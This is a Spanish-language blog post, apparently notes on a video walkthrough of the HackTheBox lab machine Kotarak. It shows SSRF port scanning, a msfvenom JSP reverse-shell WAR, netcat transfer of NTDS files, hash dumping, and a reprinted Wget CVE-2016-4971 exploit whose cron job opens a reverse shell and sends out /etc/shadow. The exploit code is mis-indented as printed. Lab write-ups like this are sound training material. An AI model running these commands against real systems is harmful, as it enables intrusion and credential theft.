---
layout: post
title: HTB_Kotarak
date: 2023/07/10
slug: HTB_Kotarak
heroImage: /assets/machines.jpg
---

# Kotarak {-}

## Introduccion {-}

La maquina del dia 17/08/2021 se llama Kotarak.

El replay del live se puede ver aqui

[![S4vitaar Kotarak maquina](https://img.youtube.com/vi/PaLGNg2k8Zs/0.jpg)](https://www.youtube.com/watch?v=PaLGNg2k8Zs)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.55
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.55
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.55 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,8009,8080,60000, 10.10.10.55 -oN targeted
```


| Puerto | Servicio    | Que se nos occure? | Que falta?           |
| ------ | ----------- | ------------------ | -------------------- |
| 22     | ssh         | Conneccion directa | usuario y contraseña |
| 8009   | tcp ajp13   | Web, Fuzzing       |                      |
| 8080   | http tomcat | Web, Fuzzing       |                      |
| 60000  | http apache | Web, Fuzzing       |                      |



### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.55:8080
```

Nada interressante aqui

#### Checkear la web por los differentes puertos {-}

- El puerto 8009 no sale Nada.
- El puerto 8080 nos saca un 404
- El puerto 60000 nos sale una pagina

La pagina en el puerto 60000 parece ser un web browser que podriamos utilizar para navigar sobre otras paginas web de manera anonyma.

Creamos nuestro proprio servidor web para ver lo que pasa.

```bash
vi index.html

Hola, Vodafone apestais y sois los peores....
```

Compartimos un servidor web con python

```bash
python3 http.server 80
```

Si desde la web lanzamos un 
```bash
 http://10.10.14.6 
```
 vemos nuestra pagina web. Intentamos crear una pagina php pero no funcciona. 

## Vulnerability Assessment {-}

### HTML Injection, XSS y SSRF {-}

Intentamos con etiquetas html y script... vemos que el servicio es vulnerable a html injection y XSS pero no podemos hacer muchas cosas con esto.

Vamos a ver si es vulnerable a un **SSRF** (Server Side Request Forgery). Si le ponemos 
```bash
 localhost:22 
```
 la pagina nos reporta la cabezera des servicio
ssh. Vamos aqui a utilizar WFUZZ para enumerar los puertos internos que estan abiertos.

#### Uzando WFUZZ para enumerar los puertos internos abiertors {-}

```bash
wfuzz -c -t 200 --hc=404 -z range,1-65535 "http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ"
```

Aqui vemos que hay muchas respuestas que nos dan 2 caracteres de respuesta y esto lo vamos a ocultar.

```bash
wfuzz -c -t 200 --hh=2 --hc=404 -z range,1-65535 "http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ"
```

Aqui vemos muchos puertos addicionales que no nos reporto el scanning de NMAP como los puertos

- 320
- 90
- 888
- 110
- 200
- 3306 (mysql)

Verificamos estos puertos con la web y encontramos cosas muy interesante como un panel de administracion en el puerto 320 y un listador
de ficheros en el puerto 888. Encontramos un fichero backup y lo miramos desde la web 
```bash
 http://10.10.10.55:60000/url.php?path=http://localhost:888/?doc=backup 
```

y mirando el codigo fuente encontramos informaciones muy interesante en el XML. Vemos un usuario admin y su contraseña.

Como vemos que el fichero XML es un fichero de configuracion tomcat miramos si las credenciales son validas en el servicio del puerto 8080
## Vuln exploit & Gaining Access {-}

### Conneccion en el panel de administracion de Tomcat {-}

Como todos los servicios tomcat, el panel de administracion se encuentra en la routa 
```bash
 /manager/html 
```


lo miramos en la url 
```bash
 http://10.10.10.55:8080/manager/html 
```


Una vez ganado el accesso al panel de administracion de tomcat, ya savemos que podemos subir un **war**
malicioso.

```bash
msfvenom -l payload | grep "jsp"
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f war -o reverse.war
```

subimos el fichero en la web.

Nos ponemos en escucha con netcat por el puerto 443

```bash
nc -nlvp 443
```

Pinchamos el fichero reverse.war y vemos que ya hemos ganado acceso al systema

```bash
whoami

> tomcat
```

### Tratamiento de la TTY {-}

```bash
which python
python -c 'import pty;pty.spawn("/bin/bash")'
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

Dandole a 
```bash
 cd /home 
```
 vemos que hay dos usuarios tomcat y atanas

```bash
find \-name user.txt 2>/dev/null | xargs cat
```

Vemos que la flag esta en el directorio **atanas** y que no podemos leer la flag

### User pivoting al usuario atanas {-}

```bash
cd tomcat
ls -la
cd to_archive
ls -la
cd pentest_data
ls -la
file *
```

Aqui vemos que hay dos ficheros y con el commando 
```bash
 file 
```
 vemos que hay un fichero data y un MS Windows registry file NT/2000.
Nos traemos estos dos ficheros a nuestro equipo de atacante.

1. en la maquina de atacante

    ```bash
    nc -nlvp 443 > ntds.bin
    ```

1. en la maquina victima

    ```bash
    nc 10.10.14.6 443 < 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
    ```

1. en la maquina de atacante

    ```bash
    nc -nlvp 443 > ntds.dit
    ```

1. en la maquina victima

    ```bash
    nc 10.10.14.6 443 < 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
    ```

#### Recuperando hashes nt desde ficheros Active Directories {-}

```bash
mv ntds.dit ntds
mv ntds.bin SYSTEM
impacket-secretsdump -ntds ntds -system SYSTEM LOCAL
```

Aqui copiamos los diferentes hashes en un fichero llamado hash


![Kotrarak-hashes](/assets/images/Kotrarak-hashes.png) 
cat hash | awk '{print $4}' FS=":" y copiamos los hashes en la pagina [crack station](https://crackstation.net/)

```{r, echo = FALSE, fig.cap="hashes crackstation", out.width="90%"}
    knitr::include_graphics("images/Kotarak-crackstation.png")

![Kotarak-crackstatio](/assets/images/Kotarak-crackstation.png) 
```bash
su atanas
Password: f16tomcat!
whoami
> atanas
```

y ya podemos ver la flag
## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /root
cat flag.txt
```

Hemos podido entrar en el repertorio root pero la flag no es la buena. Hay un fichero app.log y vemos que hay una tarea
que parece que se lanza cada 2 minutos y que nos hace un GET desde la maquina 10.0.3.133 a la maquina victima.

Intentamos ponernos en escucha al puerto 80 con ncat pero tenemos un Permission denied. Miramos si la utilidad authbind esta installada porque
authbind es un binario que permite a un usuario con bajos privilegios de ponerse en escucha por un puerto definido.

```bash
which authbind
ls -la /etc/authbind/byport
```

Aqui vemos que hay dos puertos el 21 y el 80.

```bash
authbind nc -nlvp 80
```

Ya vemos que la tarea sigue siendo ejecutada y vemos que la maquina 10.0.3.133 utiliza una version de Wget que esta desactualizada.

Miramos si existe un exploit para esta version

```bash
searchsploit wget 1.16
```

y vemos que hay un Arbitrary File Upload / Remote Code Execution.

```bash
searchsploit -x 40064
```

Seguimos por pasos la explicacion del exploit

1. creamos un fichero .wgetrc y le insertamos

    ```bash
    cat <<_EOF_>.wgetrc
    post_file = /etc/shadow
    output_document = /etc/cron.d/wget-root-shell
    _EOF_
    ```

1. creamos un script en python 

    ```python
    #!/usr/bin/env python

    #
    # Wget 1.18 < Arbitrary File Upload Exploit
    # Dawid Golunski
    # dawid( at )legalhackers.com
    #
    # http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt
    #
    # CVE-2016-4971
    #

    import SimpleHTTPServer
    import SocketServer
    import socket;

    class wgetExploit(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET(self):
        # This takes care of sending .wgetrc

        print "We have a volunteer requesting " + self.path + " by GET :)\n"
        if "Wget" not in self.headers.getheader('User-Agent'):
        print "But it's not a Wget :( \n"
            self.send_response(200)
            self.end_headers()
            self.wfile.write("Nothing to see here...")
            return

        print "Uploading .wgetrc via ftp redirect vuln. It should land in /root \n"
        self.send_response(301)
        new_path = '%s'%('ftp://anonymous@%s:%s/.wgetrc'%(FTP_HOST, FTP_PORT) )
        print "Sending redirect to %s \n"%(new_path)
        self.send_header('Location', new_path)
        self.end_headers()

    def do_POST(self):
        # In here we will receive extracted file and install a PoC cronjob

        print "We have a volunteer requesting " + self.path + " by POST :)\n"
        if "Wget" not in self.headers.getheader('User-Agent'):
        print "But it's not a Wget :( \n"
            self.send_response(200)
            self.end_headers()
            self.wfile.write("Nothing to see here...")
            return

        content_len = int(self.headers.getheader('content-length', 0))
        post_body = self.rfile.read(content_len)
        print "Received POST from wget, this should be the extracted /etc/shadow file: \n\n---[begin]---\n %s \n---[eof]---\n\n" % (post_body)

        print "Sending back a cronjob script as a thank-you for the file..."
        print "It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)"
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(ROOT_CRON)

        print "\nFile was served. Check on /root/hacked-via-wget on the victim's host in a minute! :) \n"

        return

    HTTP_LISTEN_IP = '0.0.0.0'
    HTTP_LISTEN_PORT = 80
    FTP_HOST = '10.10.10.55'
    FTP_PORT = 21

    ROOT_CRON = "* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 443 >/tmp/f \n"

    handler = SocketServer.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)

    print "Ready? Is your FTP server running?"

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((FTP_HOST, FTP_PORT))
    if result == 0:
    print "FTP found open on %s:%s. Let's go then\n" % (FTP_HOST, FTP_PORT)
    else:
    print "FTP is down :( Exiting."
    exit(1)

    print "Serving wget exploit on port %s...\n\n" % HTTP_LISTEN_PORT

    handler.serve_forever()
    ```

1. habrimos en una ventana el puerto 21 para el ftp

    ```bash
    authbind python -m pyftpdlib -p21 -w
    ```

1. en la otra ventana lanzamos el exploit

    ```bash
    authbind python wget-exploit.py
    ```

en la maquina de atacante nos ponemos en escucha por el puerto 443 y esperamos que nos entable esta Coneccion.



```bash
 whoami 
```
 -> root ;)